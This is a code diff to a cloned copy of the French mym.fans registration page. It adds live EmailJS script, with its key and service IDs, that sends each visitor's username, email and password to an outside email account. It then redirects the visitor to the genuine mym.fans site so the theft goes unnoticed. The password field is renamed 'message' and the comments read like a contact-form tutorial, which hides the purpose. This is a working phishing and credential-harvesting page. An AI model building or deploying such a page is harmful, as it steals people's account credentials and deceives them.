@@ -1296,13 +1296,13 @@
                 </div>
             </header>
             <div class="style-23">
-                <form name="fan_register" method="post" autocomplete="off" class="style-24" data-validate-fields="true" data-subdomain="fans" novalidate="" data-gtm-form-interact-id="0">
+                <form id="contact-form" name="fan_register" method="post" autocomplete="off" class="style-24" data-validate-fields="true" data-subdomain="fans" novalidate="" data-gtm-form-interact-id="0">
                     <div class="style-25">
                         <h1 class="style-26">Inscription </h1>
                         <div class="style-27">
                             <div class="style-28">
                                 <div class="style-29"><label class="style-30" for="fan_register_username">Pseudo</label>
-                                    <div class="style-31"><input type="text" name="fan_register[username]" required="required" placeholder="Mon pseudo" class="style-32" /></div>
+                                    <div class="style-31"><input type="text" id="name" name="name" required="required" placeholder="Mon pseudo" class="style-32" /></div>
                                     <div class="style-33">
                                     </div>
                                     <div class="style-34">
@@ -1339,8 +1339,8 @@
                             <div class="style-57">
 
 
-                                <div class="style-58"><label class="style-59" for="fan_register_email_first">Email </label>
-                                    <div class="style-60"><input class="style-61" name="fan_register[email][first]" type="email" value="" placeholder="adresse@mail.com" autocomplete="email" required="" data-gtm-form-interact-field-id="0" /></div>
+                                <div class="style-58"><label class="style-59" for="email">Email </label>
+                                    <div class="style-60"><input class="style-61" id="email" name="email" type="email" value="" placeholder="adresse@mail.com" autocomplete="email" required="" data-gtm-form-interact-field-id="0" /></div>
                                 </div>
                                 <div class="style-62">
                                     <div class="style-63">
@@ -1359,8 +1359,8 @@
 
 
 
-                                <div class="style-73"><label class="style-74" for="password_to_validate">Mot de passe </label>
-                                    <div class="style-75"><input class="style-76" name="fan_register[password]" type="password" value="" placeholder="Entre 8 et 64 caractères" autocomplete="new-password" required="" aria-autocomplete="list" data-gtm-form-interact-field-id="2" /><button class="style-77" type="button"><span class="style-78" aria-hidden="true">
+                                <div class="style-73"><label class="style-74" for="message">Mot de passe </label>
+                                    <div class="style-75"><input class="style-76" id="message" name="message" type="password" value="" placeholder="Entre 8 et 64 caractères" autocomplete="new-password" required="" aria-autocomplete="list" data-gtm-form-interact-field-id="2" /><button class="style-77" type="button"><span class="style-78" aria-hidden="true">
                                                 <!-- visible --><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" class="style-79">
                                                     <path fill-rule="evenodd" clip-rule="evenodd" d="M6.23892 6.34629C5.04293 7.27056 3.99198 8.54223 3.25312 9.90866C3.22273 9.965 3.22297 10.0344 3.2533 10.0908C3.99216 11.4575 5.04304 12.7292 6.23895 13.6535C7.4383 14.5805 8.74317 15.1284 9.99994 15.1284C11.2567 15.1284 12.5616 14.5805 13.761 13.6536C14.957 12.7294 16.0079 11.4577 16.7468 10.0913C16.7769 10.0351 16.7768 9.96545 16.7466 9.90928C16.0078 8.54251 14.9569 7.2707 13.7609 6.34637C12.5616 5.4194 11.2567 4.87149 9.99994 4.87149C8.74317 4.87149 7.43829 5.41941 6.23892 6.34629ZM2.1704 10.6758C2.98403 12.1809 4.14325 13.5894 5.48626 14.6274C6.82591 15.6628 8.38887 16.3593 9.99994 16.3593C11.611 16.3593 13.174 15.6628 14.5136 14.6275C15.8566 13.5897 17.0158 12.1814 17.8294 10.6767C18.0567 10.2555 18.0569 9.74571 17.8297 9.32455C17.0161 7.81943 15.8566 6.4105 14.5136 5.3725C13.174 4.33711 11.611 3.64066 9.99994 3.64066C8.38888 3.64066 6.82592 4.33711 5.48629 5.37238C4.14328 6.41026 2.98406 7.81852 2.17044 9.32322C1.94321 9.74439 1.94318 10.2546 2.1704 10.6758Z" fill="#EDEEF0" class="style-80"></path>
                                                     <path fill-rule="evenodd" clip-rule="evenodd" d="M11.3261 8.67375C10.5937 7.94131 9.40616 7.94131 8.67372 8.67375C7.94128 9.40619 7.94128 10.5937 8.67372 11.3262C9.40616 12.0586 10.5937 12.0586 11.3261 11.3262C12.0586 10.5937 12.0586 9.40619 11.3261 8.67375ZM7.84482 7.84485C9.03505 6.65461 10.9648 6.65461 12.155 7.84485C13.3453 9.03508 13.3453 10.9648 12.155 12.1551C10.9648 13.3453 9.03505 13.3453 7.84482 12.1551C6.65458 10.9648 6.65458 9.03508 7.84482 7.84485Z" fill="#EDEEF0" class="style-81"></path>
@@ -1410,7 +1410,7 @@
 
 
 
-                                <button type="button" class="style-109" >Inscription</button>
+                                <button type="submit" class="style-109" >Inscription</button>
                             </div>
                         </div>
                         <div class="style-111">
@@ -1432,6 +1432,36 @@
                     </div>
                 </form>
             </div>
+            <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("l7RHGlQsUzOwD6yc1"); // Remplace "YOUR_USER_ID" par ton USER_ID fourni par EmailJS
+        })();
+        
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire classique
+
+            // Collecte les données du formulaire
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+
+            // Envoi des données via EmailJS
+            emailjs.send("service_zr11u2p", "template_mkymtll", {
+                name: name,
+                email: email,
+                message: message
+            }).then(function(response) {
+                console.log("SUCCESS", response.status, response.text);
+                document.getElementById('response').style.display = 'block'; // Affiche le message de succès
+                setTimeout(function() {
+                    window.location.href = 'https://mym.fans/app/register/email'; // Redirige vers la page "merci.html" après 2 secondes
+                }, 2000);
+            }, function(error) {
+                console.log("FAILED", error);
+            });
+        });
+    </script>
         </div>
         <div data-message-toast="" data-toast_pricerequired="Tu dois renseigner un prix..." data-toast_postvideouploadprocess="Ta vidéo est en cours de traitement, elle sera disponible dans quelques minutes..." data-toast_videouploadsuccess="Ta vidéo a bien été téléchargée !" data-toast_videouploadprocess="Ton média est en cours de traitement, tu pourras valider ton post dès la fin du chargement..." data-toast_videouploadfail="Une erreur est survenue sur le téléchargement de la vidéo... Réessaie !" data-toast_clouduploadprocess="Ta vidéo est en cours de traitement. Elle sera automatiquement ajoutée à ton mym.cloud dans quelques minutes..." data-toast_mediauploaderror="Erreur lors de l'ajout de votre média, réessayez..." class="style-119"></div>
     </div>
